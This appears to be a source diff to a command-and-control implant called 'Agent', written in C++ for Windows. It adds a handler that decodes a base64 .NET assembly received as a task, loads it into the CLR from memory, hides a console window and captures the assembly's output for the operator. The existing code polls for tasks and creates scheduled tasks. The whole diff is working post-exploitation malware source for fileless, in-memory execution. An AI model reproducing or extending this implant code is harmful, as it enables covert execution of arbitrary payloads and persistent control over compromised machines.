@@ -1,6 +1,8 @@
 #define WIN32_LEAN_AND_MEAN
 #define WINVER 0x0600
 #define _WIN32_WINNT 0x0600
+#define PIPE_BUFFER_LENGTH 0x10000
+#define _DSA _WIN_NATIVE_DSA_STRUCT
 
 #include "Agent.h"
 #include "base64.hpp"
@@ -11,6 +13,8 @@
 #include <iphlpapi.h>
 #include <windows.h>
 #include <psapi.h>
+#include <metahost.h>
+#include "base64.hpp"
 
 #include <winternl.h>
 #include <initguid.h>
@@ -28,6 +32,7 @@
 #include <shlwapi.h>
 #include <comdef.h>
 #include "shlobj.h"
+#include <shellapi.h>
 
 #include <memory>
 #include <array>
@@ -36,6 +41,12 @@
 #include <filesystem>
 #include <fstream>
 #include <variant>
+
+#undef _DSA 
+#pragma comment(lib, "mscoree.lib")
+namespace mscorlib {
+#include "mscorlib.h"
+}
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -99,6 +110,9 @@ void Agent::Start()
                 [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response {
                     return this->CreateWindowsTaskW(winTaskRequest.taskID, winTaskRequest.data);
                 },
+                [this](const TaskRequest<CommandNetAsm>& netAsmRequest) -> Response {
+                    return this->ExecuteNetAsm(netAsmRequest.taskID, netAsmRequest.data);
+                },
                 [](const auto& unhandledRequest) -> Response {
                     return TaskResponse<TaskSuccess>{ };
                 }
@@ -160,6 +174,212 @@ void Agent::Start()
         Sleep(5000);
     }
 }
+
+HRESULT  Agent::DotnetExecute(
+    _In_  PBYTE  AssemblyBytes,
+    _In_  ULONG  AssemblySize,
+    _In_  PWSTR  AppDomainName,
+    _In_  PWSTR  Arguments,
+    _Out_ LPSTR* OutputBuffer,
+    _Out_ PULONG OutputLength
+) {
+    HRESULT                 HResult         = {};
+    ICLRMetaHost*           IMetaHost       = {};
+    ICLRRuntimeInfo*        IRuntimeInfo    = {};
+    ICorRuntimeHost*        IRuntimeHost    = {};
+    IUnknown*               IAppDomainThunk = {};
+    mscorlib::_AppDomain*   AppDomain       = {};
+    mscorlib::_Assembly*    Assembly        = {};
+    mscorlib::_MethodInfo*  MethodInfo      = {};
+    SAFEARRAYBOUND          SafeArrayBound  = {};
+    SAFEARRAY*              SafeAssembly    = {};
+    SAFEARRAY*              SafeExpected    = {};
+    SAFEARRAY*              SafeArguments   = {};
+    PWSTR*                  AssemblyArgv    = {};
+    ULONG                   AssemblyArgc    = {};
+    LONG                    Index           = {};
+    VARIANT                 VariantArgv     = {};
+    BOOL                    IsLoadable      = {};
+    HWND                    ConExist        = {};
+    HWND                    ConHandle       = {};
+    HANDLE                  BackupHandle    = {};
+    HANDLE                  IoPipeRead      = {};
+    HANDLE                  IoPipeWrite     = {};
+    SECURITY_ATTRIBUTES     SecurityAttr    = {};
+
+    // create the CLR instance
+    if ((HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost)))) {
+        printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] CLRCreateInstance: %lx\n", HResult);
+
+    // get the CLR instance version to host and start
+    if ((HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo)))) {
+        printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] IMetaHost->GetRuntime: %lx\n", HResult);
+
+    // check if the runtime we specified is loadable for the current process
+    if ((HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
+        printf("[-] IRuntimeInfo->IsLoadable Failed with Error: %lx (IsLoadable: %s)\n", HResult, IsLoadable ? "true" : "false");
+        goto e_func;
+    }
+    else printf("[*] IRuntimeInfo->IsLoadable: %lx\n", HResult);
+
+    // now load the specified CLR version into the current process
+    if ((HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost)))) {
+        printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] IRuntimeInfo->GetInterface: %lx\n", HResult);
+
+    // start the loaded CLR version in our current process
+    if ((HResult = IRuntimeHost->Start())) {
+        printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] IRuntimeHost->Start: %lx\n", HResult);
+
+    // create a new app domain in the current CLR runtime
+    if ((HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk))) {
+        printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] IRuntimeHost->CreateDomain: %lx\n", HResult);
+
+    // query app domain interface from the created app domain thunk
+    if ((HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)))) {
+        printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] IAppDomainThunk->QueryInterface: %lx\n", HResult);
+
+    // load assembly file into a safe array for AppDomain->Load_3
+    SafeArrayBound = { AssemblySize, 0 };
+    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
+
+    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);
+
+    // load the specified appdomain into the created appdomain
+    if ((HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
+        printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] AppDomain->Load_3: %lx\n", HResult);
+
+    // get entry point from the loaded assembly
+    if ((HResult = Assembly->get_EntryPoint(&MethodInfo))) {
+        printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] Assembly->get_EntryPoint: %lx\n", HResult);
+
+    // check if arguments are expected
+    if ((HResult = MethodInfo->GetParameters(&SafeExpected))) {
+        printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] MethodInfo->GetParameters: %lx\n", HResult);
+
+    // create arguments to be passed to the assembly entry point method
+    if (SafeExpected) {
+        if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
+            SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+
+            if (wcslen(Arguments)) {
+                AssemblyArgv = CommandLineToArgvW(Arguments, (PINT)&AssemblyArgc);
+            }
+
+            VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
+            VariantArgv.vt = (VT_ARRAY | VT_BSTR);
+
+            for (Index = 0; Index < AssemblyArgc; Index++) {
+                SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
+            }
+
+            Index = 0;
+            SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
+            SafeArrayDestroy(VariantArgv.parray);
+        }
+    }
+
+    // create an anonymous pipe to redirect the current executed assembly file output into a pipe.
+    SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
+    if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH))) {
+        printf("[-] CreatePipe Failed with Error: %lx\n", GetLastError());
+        HResult = GetLastError();
+        goto e_func;
+    }
+
+    // allocate a new console for the current process if no console is available or has been allocated
+    if (!(ConExist = GetConsoleWindow())) {
+        AllocConsole();
+        if ((ConHandle = GetConsoleWindow())) {
+            ShowWindow(ConHandle, SW_HIDE);
+        }
+    }
+
+    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);
+
+    // invoke the main assembly entry point with the created arguments
+    if ((HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr))) {
+        printf("[-] MethodInfo->Invoke_3 Failed with Error: %lx\n", HResult);
+        goto e_func;
+    }
+    else printf("[*] MethodInfo->Invoke_3: %lx\n", HResult);
+
+    // allocate memory to write the output from the pipe into the allocated buffer
+    if ((*OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH)))) {
+        if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr)) {
+            printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
+            goto e_func;
+        }
+    }
+    else {
+        HResult = ERROR_NOT_ENOUGH_MEMORY;
+    }
+
+e_func:
+    // restore original std handle from backup
+    if (BackupHandle) SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
+    if (AssemblyArgv) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
+    if (SafeAssembly) SafeArrayDestroy(SafeAssembly);
+    if (SafeArguments) SafeArrayDestroy(SafeArguments);
+    if (MethodInfo) MethodInfo->Release();
+    if (IRuntimeHost) IRuntimeHost->Release();
+    if (IRuntimeInfo) IRuntimeInfo->Release();
+    if (IMetaHost) IMetaHost->Release();
+    AssemblyArgv = nullptr;
+    SafeAssembly = nullptr;
+    SafeArguments = nullptr;
+    return HResult;
+}
+
+Response Agent::ExecuteNetAsm(const int& taskID, const CommandNetAsm& request) {
+    std::wstring    domain          = L"TestDomain";
+    PWSTR           pDomain         = domain.data();
+    std::wstring    args(request.args.begin(), request.args.end());
+    PWSTR           pArgs           = args.data();
+    DWORD           dwOutputSize    = NULL;
+    LPSTR           buffer          = {};
+    HRESULT         hr              = E_FAIL;
+
+    std::string raw_string_data = base64::from_base64(request.assembly);
+    std::vector<uint8_t> binary_bytes(raw_string_data.begin(), raw_string_data.end());
+
+    hr = DotnetExecute(reinterpret_cast<PBYTE>(binary_bytes.data()), static_cast<DWORD>(binary_bytes.size()), pDomain, pArgs, &buffer, &dwOutputSize);
+    if (FAILED(hr))
+    {
+        _com_error err(hr);
+        return CreateTaskResponse(taskID, NET_ASM, NO_CODE, ERROR, TaskError{ hr, err.ErrorMessage() });
+    }
+
+    return CreateTaskResponse(taskID, NET_ASM, NO_CODE, SUCCESS, TaskSuccess{ buffer });
+}
+
 
 typedef struct _LDR_DATA_TABLE_ENTRY2 {
     LIST_ENTRY InMemoryOrderLinks;
@@ -229,20 +449,18 @@ e_func:
 
 
 Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& request){
-    HRESULT         hr = E_FAIL;
-    BOOL            isSuccess = FALSE;
-    ITask* pITask = NULL;
-    IPersistFile* pIPersistFile = NULL;
-    ITaskTrigger* pITaskTrigger = NULL;
-    ITaskFolder* pITaskFolder = NULL;
-    std::wstring    uuid = {};
-    std::wstring    wPath = {};
-    ITaskScheduler* pITS = 0;
-    WORD            piNewTrigger = 0;
-    DWORD           dwFlags = 0;
+    HRESULT         hr              = E_FAIL;
+    BOOL            isSuccess       = FALSE;
+    ITask*          pITask          = NULL;
+    IPersistFile*   pIPersistFile   = NULL;
+    ITaskTrigger*   pITaskTrigger   = NULL;
+    ITaskFolder*    pITaskFolder    = NULL;
+    std::wstring    uuid            = {};
+    std::wstring    wPath           = {};
+    ITaskScheduler* pITS            = 0;
+    WORD            piNewTrigger    = 0;
+    DWORD           dwFlags         = 0;
     TASK_TRIGGER    pTrigger;
-    IEnumWorkItems* pEnumWorkItems = NULL;
-    LPWSTR          userName = NULL;
 
     std::wstring path(request.path.begin(), request.path.end());
     std::wstring username(request.username.begin(), request.username.end());
@@ -459,8 +677,8 @@ std::string Agent::GetInternalIP()
                 {
                     if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                     {
-                        sockaddr_in *sa_in = reinterpret_cast<sockaddr_in *>(pUnicast->Address.lpSockaddr);
-
+                        sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
+                        
                         int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
                         int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
                         int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
